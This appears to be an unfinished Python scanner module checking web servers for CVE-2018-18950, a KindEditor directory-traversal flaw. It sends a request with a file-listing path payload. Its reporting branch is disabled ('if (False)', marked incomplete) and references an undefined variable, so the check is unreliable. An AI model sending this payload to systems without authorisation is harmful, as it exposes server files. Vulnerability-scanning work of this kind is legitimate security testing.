#!/usr/bin/env python3
# -*- coding:utf-8 -*-

cve_2018_18950_payloads = [
    {'path': 'php/file_manager_json.php?path=/'},
]

def cve_2018_18950_scan(clients):
    ''' KindEditor 3.4.2/3.5.5版本中的php/file_manager_json.php文件存在目录遍历漏洞, 
        远程攻击者可借助"path"参数利用该漏洞浏览文件
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Kindeditor',
        'vul_type': 'File-Read',
        'vul_id': 'CVE-2018-18950',
    }

    for payload in cve_2018_18950_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue
        
        # * 还未完成
        if (False):
            results = {
                'Target': target,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
